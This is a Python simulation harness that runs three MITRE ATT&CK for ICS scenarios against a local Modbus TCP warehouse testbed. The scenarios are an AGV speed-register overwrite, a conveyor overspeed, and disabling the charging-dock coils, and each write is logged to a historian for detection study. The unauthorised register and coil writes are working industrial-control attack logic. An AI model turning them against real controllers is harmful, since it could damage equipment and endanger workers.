"""
AETHER-OT: Safe Cyberattack Simulation Harness
Executes realistic MITRE ATT&CK for ICS exploit scenarios targeting Modbus TCP and physical controllers.
"""

import time
import argparse
from pymodbus.client import ModbusTcpClient
from aether_ot.monitoring.historian import HistorianDB
from aether_ot.monitoring.tracer import CyberPhysicalTracer


class WarehouseAttackHarness:
    def __init__(self, host: str = "127.0.0.1", port: int = 5020, historian: HistorianDB = None):
        self.host = host
        self.port = port
        self.historian = historian or HistorianDB()

    def launch_speed_hack(self, target_agv: str = "AGV-02", malicious_speed: float = 2.2):
        """
        Scenario 1: Unauthorized Setpoint Injection (MITRE T0855 / T0836).
        Rogue entity from 10.0.0.99 overwrites AGV speed register to 2.2 m/s.
        Impact: AGV enters Zone B at double speed, tripping SENSOR-17 and halting conveyor.
        """
        print(f"\n[!] LAUNCHING ATTACK 1: AGV Speed Hack on {target_agv}...")
        client = ModbusTcpClient(self.host, port=self.port)
        if client.connect():
            reg_addr = 2 if target_agv == "AGV-02" else 1
            int_val = int(malicious_speed * 100)

            # 1. Instrument OTel trace
            CyberPhysicalTracer.record_modbus_span(
                client_ip="10.0.0.99",
                function_code=16,
                register=40000 + reg_addr,
                value=int_val
            )

            # 2. Write to real Modbus server
            client.write_register(reg_addr, int_val)
            client.close()

            # 3. Log to network audit historian
            self.historian.log_network_event(
                client_ip="10.0.0.99",
                function_code=16,
                register=40000 + reg_addr,
                value=malicious_speed,
                is_authorized=False,
                note=f"Unauthorized FC16 write to {target_agv} speed setpoint"
            )
            print(f"[+] Payload delivered: Register {40000 + reg_addr} set to {int_val} ({malicious_speed} m/s).")
            return True
        else:
            print(f"[-] Could not connect to Modbus TCP PLC at {self.host}:{self.port}")
            return False

    def launch_conveyor_jam(self, speed_pct: int = 100):
        """
        Scenario 2: Conveyor Motor Overspeed & Buffer Overfill (MITRE T0836 / T0814).
        Sets conveyor speed to 100%, causing boxes to accumulate and jam the packing buffer.
        """
        print("\n[!] LAUNCHING ATTACK 2: Conveyor Jam Overspeed...")
        client = ModbusTcpClient(self.host, port=self.port)
        if client.connect():
            CyberPhysicalTracer.record_modbus_span("10.0.0.88", 6, 40004, speed_pct)
            client.write_register(4, speed_pct)
            client.close()

            self.historian.log_network_event(
                client_ip="10.0.0.88",
                function_code=6,
                register=40004,
                value=speed_pct,
                is_authorized=False,
                note="Conveyor motor speed setpoint manipulated to 100%"
            )
            print(f"[+] Payload delivered: Conveyor speed forced to {speed_pct}%.")
            return True
        return False

    def launch_battery_starvation(self):
        """
        Scenario 3: Battery Starvation & Charging Denial (MITRE T0807).
        Clears charging enable coils so AGVs deplete batteries and stall mid-floor.
        """
        print("\n[!] LAUNCHING ATTACK 3: Battery Starvation Attack...")
        client = ModbusTcpClient(self.host, port=self.port)
        if client.connect():
            # Clear coil 4, 5, 6
            for coil in [4, 5, 6]:
                CyberPhysicalTracer.record_modbus_span("10.0.0.77", 5, coil, 0)
                client.write_coil(coil, False)

            client.close()
            self.historian.log_network_event(
                client_ip="10.0.0.77",
                function_code=5,
                register=4,
                value=0,
                is_authorized=False,
                note="Charging dock enable coils cleared to 0 (Disabled)"
            )
            print("[+] Payload delivered: Charging docks disabled. AGVs will deplete battery.")
            return True
        return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--scenario", type=int, default=1, choices=[1, 2, 3], help="Attack scenario ID")
    args = parser.parse_args()

    harness = WarehouseAttackHarness()
    if args.scenario == 1:
        harness.launch_speed_hack()
    elif args.scenario == 2:
        harness.launch_conveyor_jam()
    elif args.scenario == 3:
        harness.launch_battery_starvation()
